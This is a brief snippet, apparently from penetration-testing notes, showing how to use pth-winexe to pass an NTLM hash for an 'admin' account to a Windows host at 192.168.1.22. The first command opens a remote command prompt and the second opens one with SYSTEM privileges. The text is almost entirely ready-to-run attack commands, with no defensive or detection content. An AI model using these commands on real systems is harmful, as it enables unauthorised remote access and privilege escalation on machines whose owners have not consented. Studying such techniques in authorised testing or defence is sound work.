We can also use pth-winexe for same pupose as winexe. But instaead of password we are using the hash itself

```
pth-winexe -U
'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c
4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
```


Use the hash with pth-winexe to spawn a SYSTEM level command prompt:

```

 pth-winexe --system -U
'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c
4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe

```
